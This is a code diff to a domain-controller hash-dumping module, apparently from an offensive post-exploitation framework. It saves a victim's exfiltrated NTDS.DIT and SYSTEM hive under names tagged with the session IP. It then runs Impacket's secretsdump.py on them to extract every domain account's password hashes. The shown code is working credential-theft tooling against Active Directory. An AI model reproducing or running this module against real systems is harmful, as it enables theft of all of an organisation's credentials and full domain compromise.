@@ -29,9 +29,9 @@ class HashDumpDCImplant(core.implant.Implant):
 
 class HashDumpDCJob(core.job.Job):
 
-    def save_file(self, data, decode = True):
+    def save_file(self, data, name, decode = True):
         import uuid
-        save_fname = self.options.get("LPATH") + "/" + uuid.uuid4().hex
+        save_fname = self.options.get("LPATH") + "/" + name + "." + self.session.ip + "." + uuid.uuid4().hex
         save_fname = save_fname.replace("//", "/")
 
         with open(save_fname, "wb") as f:
@@ -66,19 +66,20 @@ class HashDumpDCJob(core.job.Job):
         handler.reply(200)
 
     def finish_up(self):
-        self.ntds_file = self.save_file(self.ntds_data)
+        self.ntds_file = self.save_file(self.ntds_data, 'NTDS')
         self.print_status("decoded NTDS.DIT file (%s)" % self.ntds_file)
 
-        self.system_file = self.save_file(self.system_data)
+        self.system_file = self.save_file(self.system_data, 'SYSTEM')
         self.print_status("decoded SYSTEM hive (%s)" % self.system_file)
 
         from subprocess import Popen, PIPE, STDOUT
 
-        cmd = 'secretsdump.py -ntds %s -system %s -hashes LMHASH:NTHASH LOCAL' % (self.ntds_file, self.system_file)
-        p = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True)
+        path = "data/impacket/examples/secretsdump.py"
+        cmd = ['python2', path, '-ntds', self.ntds_file, '-system', self.system_file, '-hashes', 'LMHASH:NTHASH', 'LOCAL']
+        p = Popen(cmd, stdin=PIPE, stdout=PIPE, stderr=STDOUT, close_fds=True, env={"PYTHONPATH": "./data/impacket"})
         output = p.stdout.read()
         #self.shell.print_plain(output.decode())
-        self.dump_file = self.save_file(output, False)
+        self.dump_file = self.save_file(output, 'DCDUMP', False)
         super(HashDumpDCJob, self).report(None, "", False)
 
     def done(self):
